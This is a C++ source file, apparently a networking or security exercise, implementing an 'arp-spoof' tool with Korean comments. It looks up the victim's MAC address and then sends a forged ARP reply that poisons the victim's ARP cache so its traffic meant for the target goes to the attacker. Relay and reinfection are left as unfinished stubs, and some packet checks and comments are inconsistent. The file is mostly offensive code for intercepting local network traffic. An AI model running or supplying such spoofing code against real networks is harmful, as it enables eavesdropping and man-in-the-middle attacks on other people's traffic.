#include "packet.h"
#include "get_address.h"
#include "ip.h"

#define MAC_ADDR_LEN 6 
using namespace std; 


void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

int main(int argc, char* argv[]){

    // if ( argc % 2 != 0 ){
    //     usage();
    //     return -1;
    // }


    // ======================== 초기설정 =============================
    char attacker_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char sender_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char target_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char broad_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char empty_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};

    strcpy(broad_mac, "ff:ff:ff:ff:ff:ff");
    strcpy(empty_mac, "00:00:00:00:00:00");

    char sender_ip[INET_ADDRSTRLEN];
    char target_ip[INET_ADDRSTRLEN];
    char attacker_ip[INET_ADDRSTRLEN];

    char *interface = argv[1];

    // =================== Get attacker mac, ip address ==========================
    
    uint8_t attacker_mac_temp[6];
    get_mac_address(string(argv[1]), attacker_mac_temp);
    to_hex_string(attacker_mac_temp, MAC_ADDR_LEN, attacker_mac);

    cout << "attacker mac 주소 "<< attacker_mac << endl;

    get_ip_address(interface, attacker_ip);
    std::cout << "attacker ip 주소" <<  attacker_ip << std::endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface,BUFSIZ,1,1,errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}    

    
    strcpy(sender_ip, argv[2]);
    cout << "sender_ip " << sender_ip << endl;
    strcpy(target_ip, argv[3]);
    cout << "target_ip " << target_ip << endl;
    // target_mac 주소 알아오기 
    // request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip,"request"); // target_mac 주소 알아오기 
    // reply(handle, interface, target_mac, target_ip);
    
    //std::cout <<"target_mac" <<  target_mac << std::endl;

    // sender_mac 주소 알아오기 

    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,sender_ip, "request");// sender_mac 주소 알아오기 
    while (true) {
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    int result = pcap_next_ex(handle, &header, &reply_packet);
    if (result == 0) {
        continue;
    }
    if (result == -1 || result == -2) {
        break;
    }

    EthArpPacket* pArpPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet));

    // ARP reply 패킷인지 확인 및 target IP 확인
    if (ntohs(pArpPacket->eth_.type_) == EthHdr::Arp &&
        ntohs(pArpPacket->arp_.op_) == ArpHdr::Reply &&
        pArpPacket->arp_.tip_ == Ip(sender_ip)) {

        // 받은 패킷에서 target MAC 주소 추출
        strcpy(sender_mac, std::string(pArpPacket->arp_.smac_).c_str());
        break;
    }
}

    std::cout << "sender_mac" << sender_mac << std::endl;


    // ============= ARP 스푸핑 공격 수행하기 ====================== 

    // sender 속이기 
    request(handle,interface,sender_mac,attacker_mac,target_ip,sender_mac,sender_ip, "reply");// gateway_mac request (attacekr -> gateway)
    
    // target 속이기 
    //request(handle,interface, target_mac, attacker_mac, sender_ip, target_mac, target_ip, "reply");// gateway_mac request (attacekr -> gateway)
 

    
    



    // reply()

    // relay()
    // reinfect()




}

    

